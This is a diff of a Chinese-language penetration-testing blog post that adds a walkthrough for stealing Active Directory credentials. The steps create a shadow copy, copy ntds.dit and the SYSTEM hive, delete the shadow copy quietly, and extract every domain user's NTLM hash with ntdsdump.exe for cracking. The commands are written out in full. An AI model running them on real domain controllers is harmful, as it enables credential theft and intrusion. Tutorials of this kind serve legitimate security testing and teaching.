@@ -82,7 +82,7 @@
         <div class="content">
           <article class="post-entry">
     <div class="header">
-      <div class="title">内网渗透测试tips</div>
+      <div class="title">内网渗透 Tips</div>
       <div class="meta">
         <span class="item">
           <span class="iconfont icon-time-circle"></span>
@@ -110,7 +110,7 @@
             </span>
           </span>
          
-        <span class="item leancloud-visitors" id="https://wanpan1996.github.io/2019/08/21/test/" data-flag-title="内网渗透测试tips">
+        <span class="item leancloud-visitors" id="https://wanpan1996.github.io/2019/08/21/tips1/" data-flag-title="内网渗透 Tips">
           <span class="iconfont icon-eye1"></span>
           <span class="leancloud-visitors-count"></span>
         </span>
@@ -131,13 +131,39 @@ ADC02=192.168.0.2（备份）
 </blockquote>
 <p>Hash一般存储在两个地方：SAM文件，存储在本机对应本地用户,NTDS.DIT文件，存储在域控上对应域用户。</p>
 <p>(1) 查看系统当前快照</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure>
-
-<p>(创建快照-由于类似的方法和工具网上很多这里只提一下)</p>
-<img src="/2019/08/21/test/1.png" title="This is an example image">
+<pre><code>vssadmin list shadows</code></pre><p>(创建快照-由于类似的方法和工具网上很多这里只提一下)</p>
+{% asset_img 1.png This is an example image %}
 <p>如果发现有快照，便可以通过快照查看该服务器的历史文件。</p>
 <p>(2) 创建快照</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /<span class="keyword">for</span>=c:</span><br></pre></td></tr></table></figure>
+<pre><code>vssadmin create shadow /for=c:</code></pre><img src="/2019/08/21/tips1/2.png" title="This is an example image">
+
+<p>获得Shadow Copy Volume Name为\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</p>
+<p>(3) 复制ntds.dit</p>
+<pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</code></pre>{% asset_img 3.png This is an example image %}
+
+<p>(4) 获取system.hiv</p>
+<pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM C:\system.hiv
+或者
+reg save hklm\system C:\system.hiv</code></pre><img src="/2019/08/21/tips1/4.png" title="This is an example image">
+
+<p>(5)  删除快照</p>
+<pre><code>vssadmin delete shadows /for=c: /quiet</code></pre>{% asset_img 5.png This is an example image %}
+
+<p>(6) 导出NTDS.dit 和 system.hiv 文件到本地提取hash<br>Tools url:  <a href="http://www.zcgonvh.com/post/ntds_dit_pwd_dumper.html" target="_blank" rel="noopener">http://www.zcgonvh.com/post/ntds_dit_pwd_dumper.html</a></p>
+<p><a href="http://www.zcgonvh.com/post/ntds_dit_pwd_dumper.html" target="_blank" rel="noopener">tool_url</a><br>我喜欢用ntdsdump.exe 这个工具，简单方便。</p>
+{% asset_img 6.png This is an example image %}
+
+<p>如果目标内用户数量很大的话那么就不推荐大家把这两个文件下载回本地了可以上传工具直接在目标机器上提取 然后导出含有hash的txt文件就好。<br>    <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsdump.exe &lt;-f ntds.dit&gt; &lt;-k HEX-SYS-KEY | -s system.hiv&gt; [-o out.txt] [-h] [-t JOHN|LC]</span><br></pre></td></tr></table></figure></p>
+<pre><code>但是第一次运行会可能会遇到下面的问题。</code></pre><img src="/2019/08/21/tips1/7.png" title="This is an example image">
+<p>不要慌张~<br>输入==esentutl /p /o ntds.dit== 就可以修复。</p>
+<img src="/2019/08/21/tips1/8.png" title="This is an example image">
+<p>然后在运行上一条命令就ok啦。</p>
+<img src="/2019/08/21/tips1/9.png" title="This is an example image">
+<p>这样就获取到了当前域所有用户的账号和NTLM hash了。解密的话推荐使用彩虹表。</p>
+<img src="/2019/08/21/tips1/10.png" title="This is an example image">
+
+
+
 
 
 
@@ -171,7 +197,7 @@ ADC02=192.168.0.2（备份）
       本文作者：<a href="https://wanpan1996.github.io">Saitama</a>
     </div>
     <div class="link">
-      永久链接：<a href="https://wanpan1996.github.io/2019/08/21/test/">https://wanpan1996.github.io/2019/08/21/test/</a>
+      永久链接：<a href="https://wanpan1996.github.io/2019/08/21/tips1/">https://wanpan1996.github.io/2019/08/21/tips1/</a>
     </div>
     <div class="declare">
       版权声明：本文首发于<a href="https://wanpan1996.github.io">Saitama</a>的博客，转载请注明出处！
